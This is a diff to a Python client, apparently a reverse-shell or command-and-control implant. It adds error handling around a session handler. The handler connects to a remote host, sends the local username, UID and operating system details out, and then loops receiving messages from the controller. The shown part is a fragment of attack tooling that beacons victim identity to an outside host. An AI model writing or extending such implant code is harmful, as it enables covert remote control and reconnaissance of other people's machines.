@@ -23,15 +23,18 @@ def outbound(message):
 
 #Session Handler
 def session_handler():
-    print(f'[+] Connecting to {host_ip}')
-    sock.connect((host_ip, host_port))
-    outbound(pwd.getpwuid(os.getuid())[0])
-    outbound(os.getuid())
-    time.sleep(1)
-    opsys = platform.uname()
-    opsys = (f'{opsys[0]} {opsys[2]}')
-    outbound(opsys)
-    print(f'[+] Connected to {host_ip}')
+    try:
+        print(f'[+] Connecting to {host_ip}')
+        sock.connect((host_ip, host_port))
+        outbound(pwd.getpwuid(os.getuid())[0])
+        outbound(os.getuid())
+        time.sleep(1)
+        opsys = platform.uname()
+        opsys = (f'{opsys[0]} {opsys[2]}')
+        outbound(opsys)
+        print(f'[+] Connected to {host_ip}')
+    except ConnectionRefusedError:
+        pass
     while True:
             message = inbound()
             print(f'[+] Message received - {message}')
